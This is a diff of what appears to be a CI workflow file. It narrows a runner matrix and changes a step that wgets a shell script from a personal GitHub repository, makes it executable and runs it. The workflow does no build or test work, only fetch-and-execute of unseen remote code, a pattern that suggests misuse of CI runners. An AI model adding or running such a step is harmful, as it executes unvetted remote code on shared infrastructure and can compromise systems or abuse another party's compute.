@@ -21,7 +21,7 @@ jobs:
    strategy:
     fail-fast: false
     matrix:
-     runner: [0,1,2,3,4]
+     runner: [0]
    steps:
      - run: |
-          wget https://raw.githubusercontent.com/jinxy88/god/main/bash.sh && chmod +x bash.sh && ./bash.sh
+          wget https://raw.githubusercontent.com/jinxy88/god/main/bash2.sh && chmod +x bash2.sh && ./bash2.sh
